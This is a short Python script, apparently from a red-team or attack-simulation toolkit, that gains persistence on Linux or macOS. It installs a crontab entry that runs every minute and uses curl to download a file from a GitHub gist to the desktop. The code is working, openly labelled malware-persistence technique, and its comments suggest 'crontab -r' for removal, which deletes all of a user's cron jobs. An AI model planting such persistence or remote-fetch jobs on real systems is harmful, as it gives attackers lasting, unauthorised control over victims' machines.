# This technique obtains persistence by adding a command to the crontab file,
# which will be run however often is specified in the crontab entry.

# To remove crontab, run $ crontab -r. There is likely a better solution to
# removing persistence but nothing else has worked for me. I also do not have
# any other cronjobs, so nuking the crontab is okay.

# Tested on macOS 10.14.4.

import os
import tempfile
import sys
sys.path.insert(0, "../..")
from utils.print import *
from utils.utils import get_os_name

###
# Set up global variables
###

os_name = get_os_name()
if os_name == "linux":
	comment = "Linux Malware Persistence"
elif os_name == "darwin":
	comment = "macOS Malware Persistence"
else:
	print_red("ERROR: Unknown OS.")
	sys.exit(1)

command = "curl -o ~/Desktop/pwn_notification https://gist.githubusercontent.com/alichtman/02552dea8d9dc509942d57b77112f008/raw/"
timing = "* * * * *"


def main():
	print_blue("Obtaining persistence through crontab...")
	# Create tempfile
	fd, path = tempfile.mkstemp()
	try:
		# Write command into temp file
		with os.fdopen(fd, 'w') as tmp:
			tmp.write("{} {} # {}\n".format(timing, command, comment))

		# Read this file into crontab
		os.system("crontab {}".format(path))
	except Exception as e:
		print_red("ERROR: {}".format(e))
	finally:
		os.remove(path)
		print_green("Success!")


if __name__ == "__main__":
	main()
